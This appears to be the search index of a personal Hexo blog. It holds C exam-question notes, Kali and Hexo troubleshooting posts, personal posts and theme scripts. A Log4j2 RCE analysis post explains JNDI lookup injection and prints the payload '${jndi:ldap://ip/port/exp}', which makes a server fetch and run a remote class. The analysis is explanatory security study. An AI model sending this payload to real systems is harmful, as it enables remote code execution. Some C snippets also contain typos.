<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C语言</title>
      <link href="/2022/12/28/1228/"/>
      <url>/2022/12/28/1228/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int x=0,s=0;</span><br><span class="line">while(!x!=0) s!=++x;</span><br><span class="line">printf(&quot;%d&quot;,s);</span><br></pre></td></tr></table></figure><p>关键点有两个：</p><ol><li>判断条件：<code>!x != 0</code> &#x3D;&#x3D;&gt; 目前<code>x=0, !x = 1</code>, 满足while的条件进入循环体</li><li>循环体语句: <code>s += ++x;</code><blockquote><p>知识点</p><blockquote><p>运算时<code>++x</code>的优先级高于<code>+=</code><br>故先做<code>++x</code>的运算使得x的值增加1，即运算后<code>x = 1</code>, 再做<code>+=</code>运算使得<code>s = 1</code><br>循环体做完后再度返回判断条件, <code>x = 1 ==&gt; !x = 0</code>, 不满足条件, 跳过循环体执行打印语句, 由于<code>s = 1</code>，故打印得到<code>1</code><br>本题最终答案选<code>B</code><br>补充<br><code>++x</code>和<code>x++</code>, 前者的值是先自增1再进行其它运算, 后者的值是先进行其它运算再自增1</p></blockquote></blockquote></li></ol><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x=y=0;</span><br><span class="line">while(x&lt;15) y++,x += ++y;</span><br><span class="line">printf(&quot;%d,%d&quot;,y,x);</span><br></pre></td></tr></table></figure><ol><li>条件<code>x &lt; 15</code></li><li>循环体<ul><li>其一先看<code>x</code>,因为它是判断条件的关键</li><li>其二<code>y</code>的值在<strong>一次循环</strong>中进行了<strong>两次自增</strong>, <code>x</code>决定循环次数<br><code>x += ++y</code><blockquote><p>原理和上一道题差不多, 直接进行计算</p><blockquote><p>y &#x3D; 2, x &#x3D; 2;<br>y &#x3D; 4, x &#x3D; 6;<br>y &#x3D; 6, x &#x3D; 12;<br>y &#x3D; 8, x &#x3D; 20; 此时x不再小于15,跳出循环体进行打印<br>本题最终答案为<code>D</code><br>将循环体拆解来看就是</p></blockquote></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">y++;</span><br><span class="line">++y;</span><br><span class="line">x = x + y;</span><br></pre></td></tr></table></figure><p>答案易得,单独使用<code>++x</code>或<code>x++</code>时,只看结果是没有区别的,都是<strong>使x的值增加了1</strong></p></li></ul></li></ol><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int I,word=0;</span><br><span class="line">    char c;</span><br><span class="line">    while((c=getchar())!=&#x27;\0&#x27;) --getchar()获取字符串,&#x27;\0&#x27;字符串结尾标准(规定,是自带的)</span><br><span class="line">        --while的功能就是一直读取到字符串的最后一位, 然后退出循环</span><br><span class="line">    &#123;</span><br><span class="line">        if(c==&#x27;$&#x27;) word=0; --读到`$`,使word=0</span><br><span class="line">        else if(c==&#x27;$&#x27;) --这里应该出错了,我认为应该是`else if(c!=&#x27;$&#x27;)`或者直接就是`else if`</span><br><span class="line">            if(c&gt;=&#x27;a&#x27; &amp;&amp; c&lt;=&#x27;z&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                c = c-&#x27;a&#x27;+&#x27;A&#x27;;</span><br><span class="line">                word=1;</span><br><span class="line">            &#125; --这个if就是将遇到的小写字母改为大写字母,并修改word的值为1</span><br><span class="line">            else</span><br><span class="line">                word=0;</span><br><span class="line">        puchar(c); --输出c</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始字符串为”<code>happy$$new$$year!</code>“<br>结果应该是”<code>HAPPY$$NEW$$YEAR!</code>“<br>基本就是小写换大写, <code>word</code>的值是字母就变1,不是就变0<br>故最后<code>word = 0</code></p><hr><p>本体考查重点是与<code>E</code>的等价表达式以及<code>while</code>的单个变量的判断标准<br><code>while</code>中只有单个变量时, 变量值<code>不为0</code>为真, 为<code>0</code>为假</p><p>与<code>E</code>等价的表达式</p><ol><li><code>E&gt;0||E&lt;0</code></li><li><code>!E == 0</code></li><li><code>E != 0</code><br>这个其实是和数学思维有关,推导推导就能得出来,可以想象<code>E</code>就是<code>0以外的数字</code>,通常想象为<code>1</code></li></ol><blockquote><p>额外知识点<br>do–while(E)语句特点就是会<strong>先进行一次循环体, 再判断条件</strong>, 判断通过再执行循环体, 知道不满足判断<br>while是先进行判断, 满足才执行循环体, 不满足就退出</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line">int x = 0;</span><br><span class="line">do&#123;</span><br><span class="line">    x += 1;</span><br><span class="line">    &#125;while(x = -1);    --结果为`x=1`</span><br><span class="line"></span><br><span class="line">while(x = -1)</span><br><span class="line">&#123;</span><br><span class="line">    x += 1;</span><br><span class="line">&#125;   --结果为`x=0`</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int a[3][4]; --二维数组,通俗点就是矩阵</span><br></pre></td></tr></table></figure><p><strong>重点</strong><br>| a[0][0] | a[0][1] | a[0][2] | a[0][3] |<br>| a[1][0] | a[1][1] | a[1][2] | a[1][3] |<br>| a[2][0] | a[2][1] | a[2][2] | a[2][3] |<br>无论横纵都是以<code>0</code>开始计数,只能以<code>[]</code>来框住数字！</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int a[][4]=&#123;0,0&#125;;</span><br></pre></td></tr></table></figure><p><code>[]</code>空着,默认为’1’<br>当数组没有赋值时都默认为<code>0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">即本题实际为</span><br><span class="line">int a[1][4]=&#123;0,0&#125;;</span><br><span class="line">还可以简化为</span><br><span class="line">int a[1][4]=&#123;0&#125;;</span><br><span class="line">或</span><br><span class="line">int a[][4]=&#123;0&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/cprogramming/c-arrays.html">C语言数组详解</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果修改为</span><br><span class="line">int a[][4]=&#123;1,1&#125;;</span><br><span class="line">则 a[0][0]=1; a[0][1]=1; a[0][2]=0; a[0][3]=0;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/goatherd_/article/details/105059251">当数组某些元素未被赋值时其值为多少?</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali E:Unable to locate package</title>
      <link href="/2022/12/14/1214/"/>
      <url>/2022/12/14/1214/</url>
      
        <content type="html"><![CDATA[<p>解决无法安装rpm安装包</p><h2 id="打开sources-list文件"><a href="#打开sources-list文件" class="headerlink" title="打开sources.list文件"></a>打开sources.list文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line">gedit也是个不错的编译器</span><br></pre></td></tr></table></figure><h2 id="添加内容-不是替换"><a href="#添加内容-不是替换" class="headerlink" title="添加内容(不是替换)"></a>添加内容(不是替换)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line">deb http://http.kali.org/kali sana main non-free contrib</span><br><span class="line">deb http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line">deb http://old.kali.org/kali moto main non-free contrib</span><br></pre></td></tr></table></figure><h2 id="保存，退出，更新"><a href="#保存，退出，更新" class="headerlink" title="保存，退出，更新"></a>保存，退出，更新</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Error： Spawn failed 解决方案</title>
      <link href="/2022/12/06/126/"/>
      <url>/2022/12/06/126/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>部署出现报错<br><img src="/../prtsc/126/2.jpg"></p><h2 id="查看是否能与GitHub连接"><a href="#查看是否能与GitHub连接" class="headerlink" title="查看是否能与GitHub连接"></a>查看是否能与GitHub连接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>成功<br><img src="/../prtsc/126/1.jpg"></p><p>若未出现图述情况，尝试为GitHub配置新的SSH<br>链接：<a href="https://blog.csdn.net/Gabriel_wei/article/details/122270707">配置SSH</a></p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>连接成功后，打开_cionfig.yml配置文件<br>修改内容为如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line"></span><br><span class="line">type: git</span><br><span class="line"></span><br><span class="line">repo: git@github.com:yourname/yourname.github.io.git</span><br><span class="line"></span><br><span class="line">branch: main(这里是你的默认主分支，可能是main或master或其他，查看自己的默认分支并完成修改)</span><br></pre></td></tr></table></figure><p>最后删除博客文件夹中的.deploy_git文件夹，在博客文件夹下打开Git Bash输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global core.autocrlf false</span><br></pre></td></tr></table></figure><p>结束后在Git Bash中执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><p>问题解决</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Log4j2 RCE分析</title>
      <link href="/2022/12/04/124/"/>
      <url>/2022/12/04/124/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Log4j2是一个基于Java的<strong>日志记录工具</strong>,该工具重了Log4j2框架，由于Apache Logj4c lookup功能存在<strong>递归解析功能</strong>,攻击者可直接构造恶意请求，无需进行特殊配置，即可触发远程代码执行。</p><p>漏洞是怎么导致的？<br>下面是触发漏洞的两部分关键代码：</p><ol><li>org.apache.logging.log4j.core.pattern.MessagePatternConverter 的 format() 方法（表达式内容替换）：</li></ol><p>这部分内容重点就在于代码的主要内容就是一旦发现日志中包含 ${ 就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。</p><p> 在 ${ 中可以使用的关键词如下：<br> ${可替换的内容</p><p><img src="https://image.3001.net/images/20211217/1639712382_61bc067eaee08359d0c41.png!small?1639712383466"></p><ol><li>apache.logging.log4j.core.lookup.StrSubstitutor（提取字符串，并通过 lookup 进行内容替换）</li></ol><p>日志在打印时当遇到 ${ 后，Interpolator 类以:号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。</p><p>由于log4j2 支持很多协议，例如通过 ldap 查找变量，通过 docker 查找变量，通过rmi等等。目前看到使用最多的主要是使用ldap来构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://ip/port/exp&#125;</span><br></pre></td></tr></table></figure><p>最终效果就是通过 jndi 注入，借助 ldap 服务来下载执行恶意 payload，从而执行命令，整个利用流程如图所示：<br>利用流程图</p><p><img src="https://image.3001.net/images/20211217/1639712440_61bc06b85a207de73fde2.png!small?1639712441101"></p><p>整个利用流程分两步：</p><p>第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址。</p><p>第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令。</p><p>关于利用LDAP服务来进行注入攻击已经不是第一次了，JNDI注入，即某代码中存在JDNI的string可控的情况，可构造恶意RMI或者LDAP服务端，导致远程任意类被加载，造成任意代码执行。Fastjson RCE漏洞的利用也用到LDAP注入攻击，还有其他的一些。<br>JNDI注入中RMI和LDAP与JDK版本的关系</p><p><img src="https://image.3001.net/images/20211217/1639712463_61bc06cf985900ad0692b.png!small?1639712464093"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Pastry</title>
      <link href="/2022/12/02/122/"/>
      <url>/2022/12/02/122/</url>
      
        <content type="html"><![CDATA[<h2 id="✨冰哥✨嘞😊"><a href="#✨冰哥✨嘞😊" class="headerlink" title="✨冰哥✨嘞😊"></a>✨冰哥✨嘞😊</h2><p><strong>在寒风的冬日，封校的日子里，还是冰哥暖我心嘞😘</strong></p><p><img src="/../picture/122/11.jpg"></p><p><img src="/../picture/122/22.jpg"></p><p><img src="/../picture/122/33.jpg"></p><p><img src="/../picture/122/44.jpg"></p><p><img src="/../picture/122/55.jpg"></p><p><img src="/../picture/122/66.jpg"></p><h1 id="爱你哟😘"><a href="#爱你哟😘" class="headerlink" title="爱你哟😘"></a><em><strong>爱你哟</strong></em>😘</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第一篇文章</title>
      <link href="/2022/12/01/121/"/>
      <url>/2022/12/01/121/</url>
      
        <content type="html"><![CDATA[<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a><em>Welcome</em></h2><p>欢迎来到<strong>M1NT-summer</strong>的第一篇博客<br>本博客主要用于记录本人的日常学习笔记</p><blockquote><p>✨再びあなたの笑顔を見るために✨</p><blockquote><p>✨为了再次看见你的笑脸✨</p><blockquote><p><strong>✨Hello World✨</strong> </p><blockquote><ul><li>你好, 世界!</li></ul></blockquote></blockquote></blockquote></blockquote><hr><ol><li>do everthing you want<ul><li>start: 2022&#x2F;12&#x2F;1</li><li><input checked="" disabled="" type="checkbox"> <code>hope you could never give up</code><ul><li><input checked="" disabled="" type="checkbox"> <code>永不言弃</code></li></ul></li><li>end: 20??&#x2F;?&#x2F;?<ul><li><input checked="" disabled="" type="checkbox"> <code>future is now</code><ul><li><input checked="" disabled="" type="checkbox"> <code>own fate</code></li></ul></li></ul></li></ul></li></ol><hr><ol start="2"><li><p>remenber be yourself</p><ul><li><input checked="" disabled="" type="checkbox"> <code>`Assertive`</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">Syntax</th><th align="center">Description</th><th align="right">Test Text</th></tr></thead><tbody><tr><td align="left">Header</td><td align="center">Title</td><td align="right">Here’s this</td></tr><tr><td align="left">Paragraph</td><td align="center">Text</td><td align="right">And more</td></tr></tbody></table></li></ul><p> <img src="https://th.bing.com/th/id/R.b016bd587873c72a8b04b45431210190?rik=+ZI1di2uC3nEug&riu=http://www.gousa.cn/sites/gousa.cn/files/styles/16_9_1280x720/public/images/hero_media_image/2018-04/f9810ea839276c3d4d96bbe8e2b1059f.jpeg?itok=vKzFXBPD&ehk=NABCsyGB816HnJZ2YV7eWPEQEEErdkSLMvzMEJZjO8Y=&risl=&pid=ImgRaw&r=0"></p></li></ol><p>访问我的Github-&gt;<a href="https://github.com/M1nt-summer">Github</a><br>或[Github]: <a href="https://github.com/M1nt-summer">https://github.com/M1nt-summer</a></p><p>Markdown: <a href="https://markdown.com.cn/cheat-sheet.html#%E6%80%BB%E8%A7%88">Markdown</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/11/30/1130/"/>
      <url>/2022/11/30/1130/</url>
      
        <content type="html"><![CDATA[<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/css/universe.css"/>
      <url>/css/universe.css</url>
      
        <content type="html"><![CDATA[/* 背景宇宙星光  */#universe{    display: block;    position: fixed;    margin: 0;    padding: 0;    border: 0;    outline: 0;    left: 0;    top: 0;    width: 100%;    height: 100%;    pointer-events: none;    /* 这个是调置顶的优先级的，-1在文章页下面，背景上面，个人推荐这种 */    z-index: -1;  }]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* 页脚与头图透明 */#footer {  background: transparent !important;}#page-header {  background: transparent !important;}/* 白天模式遮罩透明 */#footer::before {  background: transparent !important;}#page-header::before {  background: transparent !important;}/* 夜间模式遮罩透明 */[data-theme="dark"] #footer::before {  background: transparent !important;}[data-theme="dark"] #page-header::before {  background: transparent !important;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime.js"/>
      <url>/js/runtime.js</url>
      
        <content type="html"><![CDATA[var now = new Date; function createtime () {     now.setTime(now.getTime() + 1e3);     var o = new Date("11/30/2022 23:00:00"), r = (now - o) / 1e3 / 60 / 60 / 24, i = Math.floor(r), n = (now - o) / 1e3 / 60 / 60 - 24 * i, s = Math.floor(n);     1 == String(s).length && (s = "0" + s);     var l = (now - o) / 1e3 / 60 - 1440 * i - 60 * s, g = Math.floor(l);     1 == String(g).length && (g = "0" + g);     var d = (now - o) / 1e3 - 86400 * i - 3600 * s - 60 * g, b = Math.round(d);     1 == String(b).length && (b = "0" + b);     let c = "";     c = s < 18 && s >= 9 ? `<img class='boardsign' src='https://img.shields.io/badge/F%E5%B0%8F%E5%B1%8B-%E4%B8%8A%E7%8F%AD%E6%91%B8%E9%B1%BC%E4%B8%AD-1ade23?style=social&logo=Buy%20Me%20A%20Coffee' title='距离月入25k也就还差一个大佬带我~'><br> 本站已运行了 ${i} 天 ${s} 小时 ${g} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> ✨为了再次看见你的笑脸✨ <br> ✨再びあなたの笑顔を見るために✨ ` : `<img class='boardsign' src='https://img.shields.io/badge/F小屋-打烊休息啦-6adea8?style=social&logo=coffeescript' title='下班了就该开开心心的玩耍，嘿嘿~'><br> 本站已运行了 ${i} 天 ${s} 小时 ${g} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> ✨为了再次看见你的笑脸✨ <br> ✨再びあなたの笑顔を見るために✨ `, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = c) } setInterval((() => { createtime() }), 1e3);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/universe.js"/>
      <url>/js/universe.js</url>
      
        <content type="html"><![CDATA[function dark() {    window.requestAnimationFrame=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame;    var n,e,i,h,t=.05,s=document.getElementById("universe"),o=!0,a="180,184,240",r="226,225,142",d="226,225,224",c=[];    function f(){        n=window.innerWidth,e=window.innerHeight,i=.216*n,s.setAttribute("width",n),s.setAttribute("height",e)    }    function u(){        h.clearRect(0,0,n,e);        for(var t=c.length,i=0;i<t;i++){            var s=c[i];s.move(),s.fadeIn(),s.fadeOut(),s.draw()        }    }    function y(){        this.reset=function(){this.giant=m(3),this.comet=!this.giant&&!o&&m(10),this.x=l(0,n-10),this.y=l(0,e),this.r=l(1.1,2.6),this.dx=l(t,6*t)+(this.comet+1-1)*t*l(50,120)+2*t,this.dy=-l(t,6*t)-(this.comet+1-1)*t*l(50,120),this.fadingOut=null,this.fadingIn=!0,this.opacity=0,this.opacityTresh=l(.2,1-.4*(this.comet+1-1)),this.do=l(5e-4,.002)+.001*(this.comet+1-1)},this.fadeIn=function(){this.fadingIn&&(this.fadingIn=!(this.opacity>this.opacityTresh),this.opacity+=this.do)},this.fadeOut=function(){this.fadingOut&&(this.fadingOut=!(this.opacity<0),this.opacity-=this.do/2,(this.x>n||this.y<0)&&(this.fadingOut=!1,this.reset()))},this.draw=function(){if(h.beginPath(),this.giant)h.fillStyle="rgba("+a+","+this.opacity+")",h.arc(this.x,this.y,2,0,2*Math.PI,!1);else if(this.comet){h.fillStyle="rgba("+d+","+this.opacity+")",h.arc(this.x,this.y,1.5,0,2*Math.PI,!1);for(var t=0;t<30;t++)h.fillStyle="rgba("+d+","+(this.opacity-this.opacity/20*t)+")",h.rect(this.x-this.dx/4*t,this.y-this.dy/4*t-2,2,2),h.fill()}else h.fillStyle="rgba("+r+","+this.opacity+")",h.rect(this.x,this.y,this.r,this.r);h.closePath(),h.fill()},this.move=function(){this.x+=this.dx,this.y+=this.dy,!1===this.fadingOut&&this.reset(),(this.x>n-n/4||this.y<0)&&(this.fadingOut=!0)},setTimeout(function(){o=!1},50)}function m(t){return Math.floor(1e3*Math.random())+1<10*t}function l(t,i){return Math.random()*(i-t)+t}f(),window.addEventListener("resize",f,!1),function(){h=s.getContext("2d");for(var t=0;t<i;t++)c[t]=new y,c[t].reset();u()}(),function t(){document.getElementsByTagName('html')[0].getAttribute('data-theme')=='dark'&&u(),window.requestAnimationFrame(t)}()};dark()]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[<div id="aplayer-oSEOhviA" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="4895239160" data-server="netease" data-type="playlist" data-mode="random" data-autoplay="false" data-listmaxheight="340px" data-preload="auto" data-theme="#e3f2f5" data-volume="0.4" mutex="true"></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>电影</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
